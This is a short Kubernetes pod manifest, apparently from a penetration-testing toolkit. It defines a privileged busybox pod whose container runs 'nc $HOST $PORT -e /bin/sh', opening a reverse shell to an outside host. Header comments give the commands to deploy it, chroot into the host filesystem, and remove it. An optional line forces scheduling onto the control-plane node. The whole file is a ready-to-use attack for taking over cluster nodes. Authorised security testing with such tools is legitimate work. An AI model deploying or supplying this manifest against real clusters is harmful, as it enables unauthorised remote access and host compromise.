###########################################################
## Deploy: kubectl -n [namespace] apply -f priv-revshell-pod.yaml 
## Access: kubectl -n [namespace] exec -it priv-revshell-pod -- chroot /host
## Remove: kubectl -n [namespace] delete priv-revshell-pod
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: priv-revshell-pod
  labels:
    app: pentest
spec:
  containers:
  - name: priv-pod
    image: busybox
    securityContext:
      privileged: true
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
